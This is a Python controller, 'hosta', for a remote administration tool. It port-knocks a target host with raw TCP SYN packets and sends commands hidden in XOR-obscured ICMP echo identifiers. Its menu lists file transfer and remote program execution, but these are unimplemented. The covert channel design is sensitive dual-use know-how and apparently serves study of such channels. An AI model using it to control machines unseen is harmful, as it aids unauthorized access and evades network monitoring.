#!/usr/bin/env python3
"""hosta: control center for the remote administration tool.

Presents a menu. Option 1 port-knocks hostb and waits for the
raw-socket ack that confirms the connection. Option 2 sends the
disconnect command via raw ICMP (encrypted in the identifier field,
sequence number in the sequence field).

Usage:
    sudo python3 hosta.py <hostb_ip>
"""

import socket
import struct
import sys
import time

KNOCK_PORTS = (7000, 8000, 9000)
KNOCK_DELAY_SECONDS = 0.1
SOURCE_PORT = 54321
TTL = 64
ACK_TIMEOUT_SECONDS = 5.0
TCP_ACK_FLAG = 0x10

# Command-channel protocol: command code lives in the ICMP identifier
# (16 bits, XOR-encrypted with PRE_SHARED_KEY); sequence number lives
# in the ICMP sequence field in cleartext.
PRE_SHARED_KEY = 0xA5C3
CMD_DISCONNECT = 1

MENU_OPTIONS = (
    "Connect to hostb",
    "Disconnect from hostb",
    "Uninstall from hostb",
    "Transfer file to hostb",
    "Transfer file from hostb",
    "Watch file on hostb",
    "Watch directory on hostb",
    "Run program on hostb",
)


def detect_source_ip(destination_ip: str) -> str:
    probe_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        probe_socket.connect((destination_ip, 1))
        return probe_socket.getsockname()[0]
    finally:
        probe_socket.close()


def compute_checksum(data: bytes) -> int:
    if len(data) % 2:
        data += b"\x00"
    running_total = 0
    for byte_pair_start in range(0, len(data), 2):
        word = (data[byte_pair_start] << 8) + data[byte_pair_start + 1]
        running_total += word
        running_total = (running_total & 0xFFFF) + (running_total >> 16)
    return ~running_total & 0xFFFF


def build_ip_header(
    source_ip: str,
    destination_ip: str,
    total_length: int,
    protocol: int = socket.IPPROTO_TCP,
) -> bytes:
    def header_with_checksum(checksum_value: int) -> bytes:
        return struct.pack(
            "!BBHHHBBH4s4s",
            0x45,                     # version 4, header length 5 (20 bytes)
            0,                        # type of service
            total_length,
            0,                        # identification
            0,                        # flags + fragment offset
            TTL,
            protocol,
            checksum_value,
            socket.inet_aton(source_ip),
            socket.inet_aton(destination_ip),
        )
    correct_checksum = compute_checksum(header_with_checksum(0))
    return header_with_checksum(correct_checksum)


def build_tcp_syn_header(
    source_ip: str, destination_ip: str, destination_port: int
) -> bytes:
    def header_with_checksum(checksum_value: int) -> bytes:
        return struct.pack(
            "!HHLLBBHHH",
            SOURCE_PORT,
            destination_port,
            0,                        # sequence number
            0,                        # ack number
            0x50,                     # data offset 5 (20 bytes), reserved 0
            0x02,                     # flags: SYN only
            65535,                    # window
            checksum_value,
            0,                        # urgent pointer
        )
    pseudo_header = struct.pack(
        "!4s4sBBH",
        socket.inet_aton(source_ip),
        socket.inet_aton(destination_ip),
        0,
        socket.IPPROTO_TCP,
        20,                           # TCP header length
    )
    correct_checksum = compute_checksum(pseudo_header + header_with_checksum(0))
    return header_with_checksum(correct_checksum)


def send_single_knock(
    raw_socket: socket.socket,
    source_ip: str,
    destination_ip: str,
    destination_port: int,
) -> None:
    tcp_header = build_tcp_syn_header(source_ip, destination_ip, destination_port)
    ip_header = build_ip_header(source_ip, destination_ip, 20 + len(tcp_header))
    raw_socket.sendto(ip_header + tcp_header, (destination_ip, destination_port))


def send_port_knock_sequence(destination_ip: str, source_ip: str) -> None:
    raw_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    raw_socket.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    try:
        for knock_index, destination_port in enumerate(KNOCK_PORTS):
            if knock_index > 0:
                time.sleep(KNOCK_DELAY_SECONDS)
            send_single_knock(raw_socket, source_ip, destination_ip, destination_port)
            print(f"  SYN -> {destination_ip}:{destination_port}")
    finally:
        raw_socket.close()


def wait_for_connection_ack(
    recv_socket: socket.socket, hostb_ip: str, timeout_seconds: float
) -> bool:
    deadline = time.time() + timeout_seconds
    while True:
        remaining = deadline - time.time()
        if remaining <= 0:
            return False
        recv_socket.settimeout(remaining)
        try:
            packet, _ = recv_socket.recvfrom(65535)
        except socket.timeout:
            return False

        if len(packet) < 40:
            continue
        ip_header_length = (packet[0] & 0x0F) * 4
        if len(packet) < ip_header_length + 20:
            continue
        if socket.inet_ntoa(packet[12:16]) != hostb_ip:
            continue

        tcp_header = packet[ip_header_length:ip_header_length + 20]
        _src, dst_port, _seq, _ack, _offset, flags, _win, _chk, _urg = struct.unpack(
            "!HHLLBBHHH", tcp_header
        )
        if dst_port != SOURCE_PORT:
            continue
        if flags & TCP_ACK_FLAG:
            return True


def connect_to_hostb(destination_ip: str) -> bool:
    print("\n=== Connect ===")
    source_ip = detect_source_ip(destination_ip)
    # Open the recv socket first so we don't miss an ack that arrives
    # before we finish sending the knocks.
    recv_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
    try:
        print(f"knocking {destination_ip} from {source_ip}")
        send_port_knock_sequence(destination_ip, source_ip)
        print("sent 3 knock packets, waiting for ack...")
        if wait_for_connection_ack(recv_socket, destination_ip, ACK_TIMEOUT_SECONDS):
            print("connection established")
            return True
        print("connection failed: no ack from hostb")
        return False
    finally:
        recv_socket.close()


def encrypt_identifier(plaintext: int) -> int:
    return (plaintext ^ PRE_SHARED_KEY) & 0xFFFF


def build_icmp_echo_request(identifier_encrypted: int, sequence: int) -> bytes:
    def header_with_checksum(checksum_value: int) -> bytes:
        return struct.pack(
            "!BBHHH",
            8,                         # type: echo request
            0,                         # code
            checksum_value,
            identifier_encrypted,
            sequence,
        )
    correct_checksum = compute_checksum(header_with_checksum(0))
    return header_with_checksum(correct_checksum)


def send_command(destination_ip: str, command_code: int, sequence: int = 1) -> None:
    source_ip = detect_source_ip(destination_ip)
    raw_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    raw_socket.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    try:
        identifier = encrypt_identifier(command_code)
        icmp_header = build_icmp_echo_request(identifier, sequence)
        ip_header = build_ip_header(
            source_ip, destination_ip, 20 + len(icmp_header), socket.IPPROTO_ICMP
        )
        raw_socket.sendto(ip_header + icmp_header, (destination_ip, 0))
        print(
            f"  ICMP -> {destination_ip} "
            f"id={identifier:#06x} (cmd={command_code}) seq={sequence}"
        )
    finally:
        raw_socket.close()


def print_menu(connected: bool) -> None:
    state_label = "connected" if connected else "disconnected"
    print(f"\n--- hosta menu --- ({state_label})")
    for index, label in enumerate(MENU_OPTIONS, start=1):
        print(f"  {index}) {label}")


def main() -> int:
    if len(sys.argv) != 2:
        print("Usage: sudo python3 hosta.py <hostb_ip>", file=sys.stderr)
        return 2
    destination_ip = sys.argv[1]
    connected = False

    while True:
        print_menu(connected)
        try:
            choice = input("choice> ").strip()
        except (EOFError, KeyboardInterrupt):
            print()
            return 0

        if choice == "1":
            if connected:
                print("already connected")
                continue
            try:
                connected = connect_to_hostb(destination_ip)
            except PermissionError:
                print("permission denied (raw sockets require sudo)")
        elif choice == "2":
            if not connected:
                print("not connected; use option 1 first")
                continue
            print("\n=== Disconnect ===")
            try:
                send_command(destination_ip, CMD_DISCONNECT)
                connected = False
                print("disconnect command sent")
            except PermissionError:
                print("permission denied (raw sockets require sudo)")
        elif choice in {"3", "4", "5", "6", "7", "8"}:
            print("not implemented yet")
        else:
            print("invalid choice")


if __name__ == "__main__":
    raise SystemExit(main())
